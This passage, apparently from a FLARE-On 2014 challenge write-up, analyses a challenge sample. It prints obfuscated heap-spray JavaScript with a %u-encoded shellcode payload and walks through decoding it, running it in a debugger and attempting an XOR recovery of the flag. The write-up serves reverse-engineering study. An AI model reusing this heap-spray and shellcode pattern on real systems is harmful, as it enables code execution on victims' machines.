&lt;span style=&#34;color: #2AA198&#34;&gt;8a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81f&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;f%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #586E75&#34;&gt;// not important&lt;/span&gt;
    &lt;span style=&#34;color: #268BD2&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MPBPtdcBjTlpvyTYkSwgkrWhXL&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MPBPtdcBjTlpvyTYkSwgkrWhXL&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unescape(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%ub32f%u3791&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MPBPtdcBjTlpvyTYkSwgkrWhXL&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;IxTUQnOvHg;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unescape(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%ub32f%u3791&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;fJWhwERSDZtaZXlhcREfhZjCCVqFAPS&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;fJWhwERSDZtaZXlhcREfhZjCCVqFAPS&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHT&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;MOysyGgYplwyZzNdETHwkru&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(MOysyGgYplwyZzNdETHwkru.length&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x40000&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MOysyGgYplwyZzNdETHwkru&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MOysyGgYplwyZzNdETHwkru&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;MOysyGgYplwyZzNdETHwkr&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;DPwxazRhwbQGu&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;Array&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;100&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;MOysyGgYplwyZzNdETHwkru&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;&lt;/span&gt;

    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;142&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;--&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unescape(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;%ub550%u0166&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;bGtvKT&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bGtvKT)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;Juphd&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;bGtvKT);&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;QCZabMzxQiD&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;bGtvKT);&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(QCZabMzxQiD.length&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;bGtvKT&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0x40000&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;QCZabMzxQiD&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;QCZabMzxQiD&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;QCZabMzxQiD&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;Juphd;&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;Array&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;125&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;QCZabMzxQiD&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Obfuscated JavaScript. I executed it and printed the last variable, but the result was garbage. The code just does a lot of computatation. However variable &lt;code&gt;IxTUQnOvHg&lt;/code&gt; looks suspicious. A large number of bytes are unescaped. After reading some guides, I found out how to decode this. &lt;code&gt;%u72f9&lt;/code&gt; should be converted to &lt;code&gt;0xf972&lt;/code&gt;. I wrote a simple Python program to do this decoding. Read 6 characters, discard the first two (%u), swap characters 3 and 4 with 5 and 6. The end result is some shellcode. I used this website to convert it to an executable: &lt;a href=&#34;http://sandsprite.com/shellcode_2_exe.php&#34; target=&#34;_blank&#34;&gt;http://sandsprite.com/shellcode_2_exe.php&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After running the executable in Immunity debugger a message box pops up with an encoded message. If we look inside memory, we can find this string:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/4-1.jpg&#34; alt=&#34;MessageBox Text&#34; title=&#34;MessageBox Text&#34; /&gt;&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;First string in hex&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;2574243575216&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B2A36366B2F3274752E2A2305316B203723256B2B2D46&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The length is close to the email (29 bytes). Here&amp;rsquo;s what I thought. If it is the email then the last 13 bytes should be &lt;code&gt;@flare-on.com&lt;/code&gt;. It&amp;rsquo;s probably xor-ed with a key. If the key is smaller than 13 bytes then it is repeated and we can easily find it. How? xor is transitive. If &lt;code&gt;plaintext xor key = ciphertext&lt;/code&gt; then &lt;code&gt;key = plaintext xor ciphertext&lt;/code&gt;. If we xor the last 13 bytes of ciphertext with &lt;code&gt;@flare-on.com&lt;/code&gt; then we will find the last 13 bytes of the key. If key is smaller than plain/ciphertext (if key is as long as plain/ciphertext then we will have a &lt;code&gt;one time pad&lt;/code&gt;) it is repeated.&lt;/p&gt;

&lt;p&gt;The following Python code does it. On a side note, we really need a string xor operator in Python. I wrote one which is probably not that good.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;First string xor&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;xor&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata,mykey):&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;keylen&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;len&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mykey)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;datalen&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;len&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata)&lt;/span&gt;
    
    &lt;span style=&#34;color: #586E75&#34;&gt;# easier to just extend the key array, but probably not that efficient&lt;/span&gt;
    &lt;span style=&#34;color: #586E75&#34;&gt;# not that we care about it here ;)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;mykey&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(datalen&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;keylen)&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; 
    
    &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;join(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;chr&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ord&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(a)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;ord&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(b))&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;a,b&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;zip&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(mydata,key))&lt;/span&gt;
    
&lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# last 13 bytes&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ciphertext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;unhexlify(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)[&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:]&lt;/span&gt; 
&lt;span style=&#34;color: #93A1A1&#34;&gt;plaintext&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;@flare-on.com&amp;quot;&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(ciphertext,plaintext)&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(ciphertext,plaintext)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;# result - :(&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;# jEiPE&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Nope. Doesn&amp;rsquo;t look like it.&lt;/p&gt;

&lt;p&gt;I usually wander around in the debugger and look at memory. Run the executable in Immunity and look around in memory after the message box pops up. A little bit further up from the original message we see more &lt;code&gt;OWNED!!!&lt;/code&gt; strings (title of the message box). Right before two owneds I saw another string. This one is longer and looks more promising. Right click on it and select &lt;code&gt;Follow in Dump&lt;/code&gt;. Select the string  and again right click and select &lt;code&gt;Copy &amp;gt; To clipboard&lt;/code&gt;. It&amp;rsquo;s in Unicode so &lt;code&gt;5&lt;/code&gt; represented as &lt;code&gt;0x0035&lt;/code&gt; instead of &lt;code&gt;0x35&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/4-2.jpg&#34; alt=&#34;Interesting String&#34; title=&#34;Interesting String&#34; /&gt;&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Second string in hex&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;I&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;di&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;first&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: 